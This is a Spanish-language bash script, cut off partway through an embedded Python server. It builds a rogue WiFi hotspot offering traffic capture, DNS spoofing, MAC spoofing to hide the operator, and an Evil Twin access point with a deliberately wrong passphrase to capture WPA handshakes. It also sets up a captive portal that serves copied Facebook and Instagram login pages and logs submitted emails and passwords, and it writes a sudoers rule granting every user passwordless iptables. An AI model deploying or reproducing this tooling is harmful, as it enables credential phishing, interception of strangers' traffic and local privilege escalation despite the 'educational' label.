#!/bin/bash

#########################################
# WiFi Hotspot Multiuso
# Modos:
#   1. Monitoreo OSINT (análisis de tráfico)
#   2. DNS Spoofing (phishing educativo)
#   3. Ambos (monitoreo + spoofing)
#########################################

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

# PID del servidor web
WEB_SERVER_PID=""

# Modo de operación
MODE=""
OSINT_MODE=false
SPOOF_MODE=false

# Configuración del Hotspot (valores por defecto)
HOTSPOT_INTERFACE="wlan1"      # Interfaz para crear el AP
INTERNET_INTERFACE="wlan0"     # Interfaz con Internet
HOTSPOT_SSID="WiFi-Gratis"     # Nombre de tu red (se preguntará al usuario)
HOTSPOT_PASSWORD="12345678"    # Contraseña (mínimo 8 caracteres, o déjalo vacío para red abierta)
HOTSPOT_CHANNEL="6"
HOTSPOT_IP="192.168.50.1"
HOTSPOT_SUBNET="192.168.50.0/24"
DHCP_RANGE="192.168.50.10,192.168.50.100"
NUM_APS=1                      # Número de puntos WiFi a crear

# Portal Cautivo
CAPTIVE_PORTAL=${CAPTIVE_PORTAL:-false}  # Leer de variable de entorno o usar false por defecto
CAPTIVE_DOMAIN=${CAPTIVE_DOMAIN:-"conectate-wifi.com"}  # Dominio ficticio para el portal
CAPTIVE_REDIRECT=${CAPTIVE_REDIRECT:-"https://google.com"}  # URL de redirección después del email
CAPTIVE_TEMPLATE=${CAPTIVE_TEMPLATE:-"default"}  # Template del portal (default, captive_portal, facebook, instagram)
CAPTIVE_PORT=8080
CAPTIVE_EMAILS_FILE=""
AUTHORIZED_MACS_FILE=""

# MAC Spoofing
SPOOF_MAC=false
ORIGINAL_MAC=""
SPOOFED_MAC=""

# Directorios
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUTPUT_DIR="$SCRIPT_DIR/logs"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="$OUTPUT_DIR/hotspot_${TIMESTAMP}.log"
CLIENTS_FILE="$OUTPUT_DIR/clients_${TIMESTAMP}.txt"
TRAFFIC_PCAP="$OUTPUT_DIR/traffic_${TIMESTAMP}.pcap"
DNS_LOG="$OUTPUT_DIR/dns_queries_${TIMESTAMP}.log"
HTTP_LOG="$OUTPUT_DIR/http_requests_${TIMESTAMP}.log"
OSINT_REPORT="$OUTPUT_DIR/osint_report_${TIMESTAMP}.html"
CAPTURED_CREDS="$OUTPUT_DIR/captured_credentials_${TIMESTAMP}.txt"
HANDSHAKE_CAP="$OUTPUT_DIR/handshake_${HOTSPOT_SSID}_${TIMESTAMP}.cap"

# Archivos de configuración
HOSTAPD_CONF="$OUTPUT_DIR/config/hostapd.conf"
DNSMASQ_CONF="$OUTPUT_DIR/config/dnsmasq.conf"

# PIDs
HOSTAPD_PID=""
HOSTAPD_PIDS=()  # Array para múltiples instancias de hostapd
DNSMASQ_PID=""
TCPDUMP_PID=""
MONITOR_PID=""

# Banner
show_banner() {
    clear
    echo -e "${CYAN}"
    echo "╔════════════════════════════════════════════════╗"
    echo "║          WiFi Hotspot Multiuso                ║"
    echo "║   Monitoreo OSINT + DNS Spoofing              ║"
    echo "╚════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# Menú de selección de modo
select_mode() {
    show_banner
    echo ""
    echo -e "${GREEN}Selecciona el modo de operación:${NC}"
    echo ""
    echo -e "${BLUE}1.${NC} Modo OSINT - Monitoreo de tráfico"
    echo "   └─ Captura DNS, HTTP, IPs, análisis completo"
    echo ""
    echo -e "${MAGENTA}2.${NC} Modo DNS Spoofing - Phishing educativo"
    echo "   └─ Redirige dominios a páginas falsas"
    echo ""
    echo -e "${CYAN}3.${NC} Modo Completo - OSINT + Spoofing"
    echo "   └─ Monitoreo + redirección de dominios"
    echo ""
    echo -e "${YELLOW}4.${NC} Salir"
    echo ""
    
    read -p "Opción [1-4]: " choice
    
    case $choice in
        1)
            MODE="osint"
            OSINT_MODE=true
            SPOOF_MODE=false
            log "Modo seleccionado: OSINT Monitoring"
            ;;
        2)
            MODE="spoof"
            OSINT_MODE=false
            SPOOF_MODE=true
            log "Modo seleccionado: DNS Spoofing"
            ;;
        3)
            MODE="full"
            OSINT_MODE=true
            SPOOF_MODE=true
            log "Modo seleccionado: Completo (OSINT + Spoofing)"
            ;;
        4)
            echo "Saliendo..."
            exit 0
            ;;
        *)
            error "Opción inválida"
            sleep 2
            select_mode
            ;;
    esac
    
    echo ""
}

# Logging
log() {
    echo -e "${GREEN}[+]${NC} $1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

error() {
    echo -e "${RED}[!]${NC} $1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] ERROR: $1" >> "$LOG_FILE"
}

warning() {
    echo -e "${YELLOW}[*]${NC} $1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] WARNING: $1" >> "$LOG_FILE"
}

info() {
    echo -e "${BLUE}[i]${NC} $1"
}

success() {
    echo -e "${GREEN}[OK]${NC} $1"
}

# Verificar root
if [[ $EUID -ne 0 ]]; then
   error "Este script debe ejecutarse como root (sudo)"
   exit 1
fi

# Crear directorios
mkdir -p "$OUTPUT_DIR"
mkdir -p "$OUTPUT_DIR/config"
mkdir -p "$OUTPUT_DIR/captive_portal"

# Importar funciones de spoofing
source "$SCRIPT_DIR/spoof_functions.sh"

# Generar MAC aleatoria
generate_random_mac() {
    # Genera una MAC con OUI válido (primeros 3 bytes)
    # Usamos OUI de fabricantes comunes para parecer más legítimo
    local ouis=("00:1A:2B" "00:1E:58" "00:21:5D" "00:23:69" "00:25:00" "00:26:5A" "00:1C:B3" "00:1D:7E")
    local oui=${ouis[$RANDOM % ${#ouis[@]}]}
    local nic=$(printf '%02X:%02X:%02X' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
    echo "$oui:$nic"
}

# Configuración interactiva del hotspot
configure_hotspot_settings() {
    echo ""
    echo -e "${CYAN}╔════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║        Configuracion del Hotspot              ║${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════╝${NC}"
    echo ""
    
    # Preguntar nombre de la red (SSID)
    echo -e "${GREEN}[1/6]${NC} Nombre de la red WiFi (SSID)"
    echo -e "      ${YELLOW}Por defecto: $HOTSPOT_SSID${NC}"
    read -p "      Ingresa el nombre (Enter para usar el default): " custom_ssid
    if [[ -n "$custom_ssid" ]]; then
        HOTSPOT_SSID="$custom_ssid"
        log "SSID personalizado: $HOTSPOT_SSID"
    fi
    echo ""
    
    # Preguntar contraseña
    echo -e "${GREEN}[2/6]${NC} Contraseña de la red"
    echo -e "      ${BLUE}(Enter vacío = Red ABIERTA sin contraseña)${NC}"
    read -p "      Ingresa la contraseña (mín 8 chars): " custom_pass
    if [[ -z "$custom_pass" ]]; then
        HOTSPOT_PASSWORD=""
        log "Red configurada como ABIERTA (sin contraseña)"
        echo -e "      ${YELLOW}[!]${NC} Red configurada como ${RED}ABIERTA${NC}"
    elif [[ ${#custom_pass} -lt 8 ]]; then
        warning "La contraseña debe tener mínimo 8 caracteres."
        warning "Configurando red como ABIERTA."
        HOTSPOT_PASSWORD=""
    else
        HOTSPOT_PASSWORD="$custom_pass"
        log "Contraseña personalizada configurada"
    fi
    echo ""
    
    # Preguntar canal
    echo -e "${GREEN}[3/6]${NC} Canal WiFi (1-11)"
    echo -e "      ${YELLOW}Por defecto: $HOTSPOT_CHANNEL${NC}"
    read -p "      Ingresa el canal (Enter para usar el default): " custom_channel
    if [[ -n "$custom_channel" ]] && [[ "$custom_channel" =~ ^[0-9]+$ ]] && [[ "$custom_channel" -ge 1 ]] && [[ "$custom_channel" -le 11 ]]; then
        HOTSPOT_CHANNEL="$custom_channel"
        log "Canal personalizado: $HOTSPOT_CHANNEL"
    fi
    echo ""
    
    # Preguntar MAC Spoofing
    echo -e "${GREEN}[4/6]${NC} MAC Spoofing"
    echo -e "      ${MAGENTA}¿Deseas cambiar la MAC de la interfaz $HOTSPOT_INTERFACE?${NC}"
    echo -e "      ${BLUE}Esto puede ayudar a ocultar tu identidad de hardware${NC}"
    echo ""
    echo -e "      ${YELLOW}1.${NC} No cambiar MAC (usar la original)"
    echo -e "      ${YELLOW}2.${NC} Generar MAC aleatoria"
    echo -e "      ${YELLOW}3.${NC} Ingresar MAC personalizada"
    echo ""
    read -p "      Opción [1-3] (Enter para no cambiar): " mac_choice
    
    case $mac_choice in
        2)
            SPOOF_MAC=true
            SPOOFED_MAC=$(generate_random_mac)
            log "MAC Spoofing activado: $SPOOFED_MAC"
            echo -e "      ${GREEN}[OK]${NC} MAC generada: ${CYAN}$SPOOFED_MAC${NC}"
            ;;
        3)
            echo -e "      ${BLUE}Formato: XX:XX:XX:XX:XX:XX${NC}"
            read -p "      Ingresa la MAC: " custom_mac
            if [[ "$custom_mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                SPOOF_MAC=true
                SPOOFED_MAC="$custom_mac"
                log "MAC Spoofing activado: $SPOOFED_MAC"
                echo -e "      ${GREEN}[OK]${NC} MAC personalizada: ${CYAN}$SPOOFED_MAC${NC}"
            else
                warning "Formato de MAC inválido. No se cambiará la MAC."
            fi
            ;;
        *)
            SPOOF_MAC=false
            log "MAC Spoofing desactivado"
            ;;
    esac
    echo ""
    
    # Mostrar resumen de configuración
    echo -e "${CYAN}╔════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║           Resumen de Configuracion            ║${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "   ${GREEN}SSID:${NC}        $HOTSPOT_SSID"
    if [[ -n "$HOTSPOT_PASSWORD" ]]; then
        echo -e "   ${GREEN}Contraseña:${NC}  $HOTSPOT_PASSWORD"
        echo -e "   ${GREEN}Seguridad:${NC}   WPA2"
    else
        echo -e "   ${GREEN}Contraseña:${NC}  ${RED}(Red Abierta)${NC}"
        echo -e "   ${GREEN}Seguridad:${NC}   ${RED}Ninguna${NC}"
    fi
    echo -e "   ${GREEN}Canal:${NC}       $HOTSPOT_CHANNEL"
    echo -e "   ${GREEN}Interfaz AP:${NC} $HOTSPOT_INTERFACE"
    echo -e "   ${GREEN}Internet:${NC}    $INTERNET_INTERFACE"
    if $SPOOF_MAC; then
        echo -e "   ${GREEN}MAC Spoof:${NC}   ${MAGENTA}$SPOOFED_MAC${NC}"
    else
        echo -e "   ${GREEN}MAC Spoof:${NC}   Desactivado"
    fi
    echo ""
    
    read -p "¿Continuar con esta configuración? [S/n]: " confirm
    if [[ "$confirm" =~ ^[Nn]$ ]]; then
        configure_hotspot_settings
    fi
    
    echo ""
    log "Configuración confirmada"
}

# Aplicar MAC Spoofing (se llama cuando la interfaz ya está DOWN)
apply_mac_spoofing() {
    if $SPOOF_MAC && [[ -n "$SPOOFED_MAC" ]]; then
        log "Aplicando MAC Spoofing..."
        
        # Guardar MAC original (la interfaz debe estar down)
        ORIGINAL_MAC=$(cat /sys/class/net/$HOTSPOT_INTERFACE/address 2>/dev/null)
        if [[ -z "$ORIGINAL_MAC" ]]; then
            ORIGINAL_MAC=$(ip link show "$HOTSPOT_INTERFACE" | grep ether | awk '{print $2}')
        fi
        log "MAC original guardada: $ORIGINAL_MAC"
        
        # Asegurarse que la interfaz está completamente down
        ip link set "$HOTSPOT_INTERFACE" down 2>/dev/null
        sleep 0.5
        
        # Intentar con ip link (método estándar)
        ip link set "$HOTSPOT_INTERFACE" address "$SPOOFED_MAC" 2>/dev/null
        
        # Si falla, intentar con macchanger si está disponible
        if ! ip link show "$HOTSPOT_INTERFACE" | grep -qi "$SPOOFED_MAC"; then
            if command -v macchanger &> /dev/null; then
                log "Intentando con macchanger..."
                macchanger -m "$SPOOFED_MAC" "$HOTSPOT_INTERFACE" 2>/dev/null
            fi
        fi
        
        # Verificar cambio (sin subir la interfaz aún)
        local new_mac=$(cat /sys/class/net/$HOTSPOT_INTERFACE/address 2>/dev/null | tr '[:upper:]' '[:lower:]')
        local target_mac=$(echo "$SPOOFED_MAC" | tr '[:upper:]' '[:lower:]')
        
        if [[ "$new_mac" == "$target_mac" ]]; then
            success "MAC cambiada exitosamente: $SPOOFED_MAC"
        else
            warning "No se pudo cambiar la MAC (driver puede no soportarlo)"
            warning "MAC actual: $new_mac"
            info "Tip: Intenta instalar macchanger: sudo apt install macchanger"
            SPOOF_MAC=false
        fi
        # NO subir la interfaz aquí, se hace después en main()
    fi
}

# Restaurar MAC original
restore_original_mac() {
    if $SPOOF_MAC && [[ -n "$ORIGINAL_MAC" ]]; then
        log "Restaurando MAC original..."
        ip link set "$HOTSPOT_INTERFACE" down
        ip link set "$HOTSPOT_INTERFACE" address "$ORIGINAL_MAC"
        ip link set "$HOTSPOT_INTERFACE" up
        success "MAC restaurada: $ORIGINAL_MAC"
    fi
}

# Seleccionar modo de operación
select_mode

# Configuración interactiva
configure_hotspot_settings

# Limpieza al salir
cleanup() {
    echo ""
    echo ""
    log "🛑 Deteniendo hotspot y limpiando..."
    
    # Matar procesos específicos por PID
    [[ -n "$HOSTAPD_PID" ]] && kill -TERM $HOSTAPD_PID 2>/dev/null
    [[ -n "$DNSMASQ_PID" ]] && kill -TERM $DNSMASQ_PID 2>/dev/null
    [[ -n "$TCPDUMP_PID" ]] && kill -TERM $TCPDUMP_PID 2>/dev/null
    [[ -n "$MONITOR_PID" ]] && kill -TERM $MONITOR_PID 2>/dev/null
    [[ -n "$WEBSERVER_PID" ]] && kill -TERM $WEBSERVER_PID 2>/dev/null
    [[ -n "$HANDSHAKE_TCPDUMP_PID" ]] && kill -TERM $HANDSHAKE_TCPDUMP_PID 2>/dev/null
    [[ -n "$HANDSHAKE_TSHARK_PID" ]] && kill -TERM $HANDSHAKE_TSHARK_PID 2>/dev/null
    
    # Matar APs falsos
    for pid in "${HOSTAPD_PIDS[@]}"; do
        [[ -n "$pid" ]] && kill -TERM $pid 2>/dev/null
    done
    
    sleep 1
    
    # Matar todos los procesos relacionados (fuerza bruta)
    pkill -9 hostapd 2>/dev/null
    pkill -9 dnsmasq 2>/dev/null
    pkill -9 tcpdump 2>/dev/null
    pkill -9 tshark 2>/dev/null
    pkill -9 airbase-ng 2>/dev/null
    pkill -9 mdk4 2>/dev/null
    pkill -9 "spoof_server.py" 2>/dev/null
    pkill -9 "captive_server.py" 2>/dev/null
    pkill -f "tail -f.*hostapd.log" 2>/dev/null
    pkill -f "handshake" 2>/dev/null
    
    # Eliminar interfaz monitor si existe
    iw dev "${HOTSPOT_INTERFACE}mon" del 2>/dev/null
    
    # Limpiar archivos temporales
    rm -f /etc/sudoers.d/captive_portal 2>/dev/null
    
    # Restaurar iptables
    iptables --flush
    iptables -t nat --flush
    iptables -P FORWARD DROP
    
    # Desactivar IP forwarding
    echo 0 > /proc/sys/net/ipv4/ip_forward
    
    # Bajar interfaz
    ifconfig "$HOTSPOT_INTERFACE" down 2>/dev/null
    
    # Restaurar MAC original si fue cambiada
    restore_original_mac
    
    # Limpiar archivos temporales
    rm -f "$HOSTAPD_CONF" "$DNSMASQ_CONF" 2>/dev/null
    
    # Generar reporte final
    generate_osint_report
    
    log "Limpieza completada"
    log "Logs guardados en: $OUTPUT_DIR"
    exit 0
}

trap cleanup SIGINT SIGTERM EXIT

# Verificar herramientas
check_tools() {
    log "Verificando herramientas necesarias..."
    
    local missing=false
    
    for tool in hostapd dnsmasq tcpdump tshark iptables; do
        if ! command -v $tool &> /dev/null; then
            error "$tool no encontrado"
            missing=true
        fi
    done
    
    if $missing; then
        error "Instala las herramientas faltantes:"
        info "sudo apt install -y hostapd dnsmasq tcpdump tshark iptables"
        exit 1
    fi
    
    success "Todas las herramientas instaladas"
}

# Verificar interfaces
check_interfaces() {
    log "Verificando interfaces de red..."
    
    if ! iwconfig "$HOTSPOT_INTERFACE" &> /dev/null; then
        error "Interfaz $HOTSPOT_INTERFACE no encontrada"
        exit 1
    fi
    
    if ! iwconfig "$INTERNET_INTERFACE" &> /dev/null; then
        error "Interfaz $INTERNET_INTERFACE no encontrada"
        exit 1
    fi
    
    # Verificar que la interfaz de Internet esté conectada
    if ! ping -c 1 8.8.8.8 -I "$INTERNET_INTERFACE" &> /dev/null; then
        warning "La interfaz $INTERNET_INTERFACE no tiene conexión a Internet"
        warning "El hotspot funcionará pero sin Internet"
    else
        success "Conexión a Internet verificada en $INTERNET_INTERFACE"
    fi
    
    success "Interfaces verificadas"
}

# Configurar hostapd
configure_hostapd() {
    log "Configurando Access Point..."
    
    if [[ -z "$HOTSPOT_PASSWORD" ]]; then
        # Red abierta (sin contraseña)
        cat > "$HOSTAPD_CONF" << EOF
interface=$HOTSPOT_INTERFACE
driver=nl80211
ssid=$HOTSPOT_SSID
hw_mode=g
channel=$HOTSPOT_CHANNEL
macaddr_acl=0
ignore_broadcast_ssid=0
EOF
        info "Red configurada como ABIERTA (sin contraseña)"
    else
        # ESTRATEGIA CORRECTA: Evil Twin con PSK incorrecta para capturar M1/M2
        cat > "$HOSTAPD_CONF" << EOF
interface=$HOTSPOT_INTERFACE
driver=nl80211
ssid=$HOTSPOT_SSID
hw_mode=g
channel=$HOTSPOT_CHANNEL
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
# PSK INCORRECTA INTENCIONALMENTE - para forzar fallo después de M2
wpa_passphrase=wrongpassword123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_pairwise=CCMP
# Configuración para capturar handshakes parciales
max_num_sta=255
ap_max_inactivity=300
# Logging detallado para ver fallos de MIC
logger_syslog=-1
logger_syslog_level=0
logger_stdout=-1
logger_stdout_level=0
EOF
        
        info "Red configurada como Evil Twin (PSK incorrecta para capturar M1/M2)"
    fi
    
    success "Hostapd configurado"
}

# Crear portal cautivo
create_captive_portal() {
    log "Configurando portal cautivo..."
    
    # Crear directorio para el portal
    local portal_dir="$OUTPUT_DIR/captive_portal"
    mkdir -p "$portal_dir"
    
    # Archivos para almacenar datos
    CAPTIVE_EMAILS_FILE="$SCRIPT_DIR/captive_credentials.txt"  # En carpeta raíz para Monitoring
    AUTHORIZED_MACS_FILE="$OUTPUT_DIR/authorized_macs.txt"     # En logs/
    touch "$CAPTIVE_EMAILS_FILE"
    touch "$AUTHORIZED_MACS_FILE"
    
    # Copiar template personalizado del directorio webcautivo
    local template_dir="$SCRIPT_DIR/webcautivo"
    log "Copiando portal cautivo personalizado desde: $template_dir"
    
    # Copiar todo el directorio webcautivo (index.html + facebook.html + instagram.html + imágenes)
    if [ -d "$template_dir" ]; then
        info "Copiando template personalizado (index + facebook + instagram + imágenes)..."
        cp -v "$template_dir"/index.html "$portal_dir/" 2>&1 | tee -a "$LOG_FILE"
        cp -v "$template_dir"/facebook.html "$portal_dir/" 2>&1 | tee -a "$LOG_FILE"
        cp -v "$template_dir"/instagram.html "$portal_dir/" 2>&1 | tee -a "$LOG_FILE"
        cp -v "$template_dir"/*.png "$portal_dir/" 2>&1 | tee -a "$LOG_FILE"
        cp -v "$template_dir"/*.jpg "$portal_dir/" 2>&1 | tee -a "$LOG_FILE"
        
        # Verificar que los archivos se copiaron
        if [ -f "$portal_dir/index.html" ] && [ -f "$portal_dir/facebook.html" ] && [ -f "$portal_dir/instagram.html" ]; then
            success "Template personalizado copiado exitosamente"
            log "Archivos copiados:"
            ls -lh "$portal_dir/" | tee -a "$LOG_FILE"
        else
            error "✗ Error al copiar archivos del template"
            warning "Usando template por defecto como fallback"
        fi
    else
        error "✗ Directorio webcautivo no encontrado en: $template_dir"
        warning "Usando template por defecto"
    fi
    
    # Si no se copió el template personalizado, crear el por defecto
    if [ ! -f "$portal_dir/index.html" ]; then
        # Crear página HTML del portal cautivo por defecto
        cat > "$portal_dir/index.html" << EOF
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>$CAPTIVE_DOMAIN - Portal de Acceso</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 400px;
            width: 100%;
            padding: 40px;
            text-align: center;
        }
        .logo {
            font-size: 60px;
            margin-bottom: 20px;
        }
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 28px;
        }
        p {
            color: #666;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        label {
            display: block;
            color: #555;
            margin-bottom: 8px;
            font-weight: 500;
        }
        input[type="email"] {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input[type="email"]:focus {
            outline: none;
            border-color: #667eea;
        }
        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
        }
        button:active {
            transform: translateY(0);
        }
        .success {
            display: none;
            color: #10b981;
            margin-top: 20px;
            font-weight: 600;
        }
        .error {
            display: none;
            color: #ef4444;
            margin-top: 20px;
            font-weight: 600;
        }
        .info-box {
            background: #f3f4f6;
            padding: 15px;
            border-radius: 10px;
            margin-top: 20px;
            font-size: 14px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">WiFi</div>
        <h1>$CAPTIVE_DOMAIN</h1>
        <p>Para acceder a internet, por favor ingresa tu correo electrónico</p>
        
        <form id="access-form">
            <div class="form-group">
                <label for="email">Correo Electrónico</label>
                <input type="email" id="email" name="email" placeholder="tu@email.com" required>
            </div>
            <button type="submit">Conectar a Internet</button>
        </form>
        
        <div class="success" id="success-msg">
            Acceso concedido! Redirigiendo...
        </div>
        <div class="error" id="error-msg">
            Error al conectar. Intenta nuevamente.
        </div>
        
        <div class="info-box">
            Tu informacion esta segura y solo se usa para proporcionar acceso a internet
        </div>
    </div>
    
    <script>
        document.getElementById('access-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const button = e.target.querySelector('button');
            const successMsg = document.getElementById('success-msg');
            const errorMsg = document.getElementById('error-msg');
            
            button.disabled = true;
            button.textContent = '⏳ Conectando...';
            
            try {
                const response = await fetch('/authorize', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email: email })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    successMsg.style.display = 'block';
                    errorMsg.style.display = 'none';
                    
                    setTimeout(() => {
                        window.location.href = '$CAPTIVE_REDIRECT';
                    }, 2000);
                } else {
                    errorMsg.style.display = 'block';
                    successMsg.style.display = 'none';
                    button.disabled = false;
                    button.textContent = 'Conectar a Internet';
                }
            } catch (error) {
                errorMsg.style.display = 'block';
                successMsg.style.display = 'none';
                button.disabled = false;
                button.textContent = 'Conectar a Internet';
            }
        });
    </script>
</body>
</html>
EOF
    fi
    
    success "Portal cautivo creado en $portal_dir"
}

# Configurar permisos sudo para el servidor del portal
configure_captive_portal_sudo() {
    log "Configurando permisos sudo para el portal cautivo..."
    
    # Crear archivo sudoers temporal para permitir iptables sin contraseña
    local sudoers_file="/etc/sudoers.d/captive_portal"
    
    cat > /tmp/captive_portal_sudoers << 'EOF'
# Permitir que cualquier usuario ejecute iptables sin contraseña para el portal cautivo
ALL ALL=(ALL) NOPASSWD: /usr/sbin/iptables
ALL ALL=(ALL) NOPASSWD: /sbin/iptables
EOF
    
    # Validar y mover el archivo
    if visudo -c -f /tmp/captive_portal_sudoers > /dev/null 2>&1; then
        mv /tmp/captive_portal_sudoers "$sudoers_file"
        chmod 0440 "$sudoers_file"
        success "Permisos sudo configurados"
    else
        warning "No se pudo configurar sudoers, el portal puede no funcionar correctamente"
        rm -f /tmp/captive_portal_sudoers
    fi
}

# Iniciar servidor del portal cautivo
start_captive_portal_server() {
    log "Iniciando servidor del portal cautivo en puerto $CAPTIVE_PORT..."
    
    # Configurar permisos sudo primero
    configure_captive_portal_sudo
    
    # Crear script Python para el servidor del portal
    cat > "$OUTPUT_DIR/captive_server.py" << 'PYEOF'
#!/usr/bin/env python3
import sys
import json
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
import subprocess
import os

# Configurar rutas absolutas y variables de entorno
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_DIR = os.path.join(SCRIPT_DIR, 'logs')

# Establecer variables de entorno desde argumentos del script
if len(sys.argv) > 8:
    os.environ['HOTSPOT_INTERFACE'] = sys.argv[8]
else:
    os.environ['HOTSPOT_INTERFACE'] = 'wlan0'  # Valor por defecto

EMAILS_FILE = sys.argv[1] if len(sys.argv) > 1 else os.path.join(SCRIPT_DIR, "captive_credentials.txt")
AUTHORIZED_MACS_FILE = sys.argv[2] if len(sys.argv) > 2 else os.path.join(OUTPUT_DIR, "authorized_macs.txt")
HOTSPOT_IP = sys.argv[3] if len(sys.argv) > 3 else "192.168.50.1"
PORTAL_DIR = sys.argv[4] if len(sys.argv) > 4 else os.path.join(OUTPUT_DIR, "captive_portal")
CAPTIVE_DOMAIN = sys.argv[5] if len(sys.argv) > 5 else "conectate-wifi.com"
PORT = int(sys.argv[6]) if len(sys.argv) > 6 else 8080
REDIRECT_URL = sys.argv[7] if len(sys.argv) > 7 else "https://google.com"

# Debug info
print(f"[DEBUG] Portal cautivo iniciado con:")
print(f"[DEBUG] EMAILS_FILE: {EMAILS_FILE} (para Monitoring)")
print(f"[DEBUG] AUTHORIZED_MACS_FILE: {AUTHORIZED_MACS_FILE}")
print(f"[DEBUG] PORTAL_DIR: {PORTAL_DIR}")
print(f"[DEBUG] HOTSPOT_IP: {HOTSPOT_IP}")
print(f"[DEBUG] CAPTIVE_DOMAIN: {CAPTIVE_DOMAIN}")
print(f"[DEBUG] PORT: {PORT}")

class CaptivePortalHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        import os
        import mimetypes
        
        # Obtener el host desde el header
        host = self.headers.get('Host', HOTSPOT_IP)
        
        # Si acceden por IP, redirigir al dominio ficticio
        if HOTSPOT_IP in host and CAPTIVE_DOMAIN and not CAPTIVE_DOMAIN in host:
            self.send_response(302)
            self.send_header('Location', f'http://{CAPTIVE_DOMAIN}:{self.server.server_port}/')
            self.end_headers()
            return
        
        # Limpiar la ruta
        path = self.path.split('?')[0]  # Eliminar query strings
        if path == '/':
            path = '/index.html'
        
        # Construir ruta completa del archivo
        file_path = os.path.join(PORTAL_DIR, path.lstrip('/'))
        
        # Verificar si el archivo existe
        if os.path.isfile(file_path):
            # Determinar el tipo MIME
            mime_type, _ = mimetypes.guess_type(file_path)
            if mime_type is None:
                mime_type = 'application/octet-stream'
            
            # Servir el archivo
            try:
                self.send_response(200)
                self.send_header('Content-type', mime_type)
                # Añadir encabezados para evitar caché
                self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
                self.send_header('Pragma', 'no-cache')
                self.send_header('Expires', '0')
                self.end_headers()
                with open(file_path, 'rb') as f:
                    self.wfile.write(f.read())
                print(f"[+] Servido: {path} ({mime_type})")
            except Exception as e:
                print(f"[!] Error sirviendo {path}: {e}")
                self.send_error(500, f"Error interno: {e}")
        else:
            # Archivo no encontrado, redirigir al index si no estamos ya en la página principal
            print(f"[!] Archivo no encontrado: {file_path}")
            if path != '/index.html':
                self.send_response(302)
                self.send_header('Location', f'http://{CAPTIVE_DOMAIN}:{self.server.server_port}/')
                self.end_headers()
            else:
                # Si el index.html no existe, mostrar una página de error básica
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                error_html = f"""<html><head><title>Portal Cautivo</title></head>
                <body style='font-family: sans-serif; text-align: center; padding: 50px;'>
                <h1>Portal Cautivo</h1>
                <p>No se encontró la página del portal cautivo. Por favor, introduzca su email para continuar.</p>
                <form id='login' onsubmit='event.preventDefault(); login();'>
                <input type='email' id='email' placeholder='Email' required style='padding: 8px; width: 250px; margin: 10px;'><br>
                <button type='submit' style='padding: 8px 20px; background: #4285f4; color: white; border: none; border-radius: 4px;'>Conectar</button>
                </form>
                <script>
                function login() {{
                    var email = document.getElementById('email').value;
                    fetch('/authorize', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{'email': email}})
                    }})
                    .then(response => response.json())
                    .then(data => {{
                        if (data.success) {{
                            window.location.href = '{REDIRECT_URL}';
                        }}
                    }});
                }}
                </script>
                </body></html>"""
                self.wfile.write(error_html.encode())
    
    def do_POST(self):
        print(f"[DEBUG] POST request a: {self.path}")
        if self.path == '/authorize':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data.decode('utf-8'))
                email = data.get('email', '')
                password = data.get('password', '')
                site = data.get('site', '')
                
                # Obtener MAC e información del cliente
                client_ip = self.client_address[0]
                mac = self.get_mac_from_ip(client_ip)
                hostname = self.get_hostname_from_ip(client_ip)
                
                if email and mac:
                    # Guardar email con timestamp
                    import datetime
                    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    
                    try:
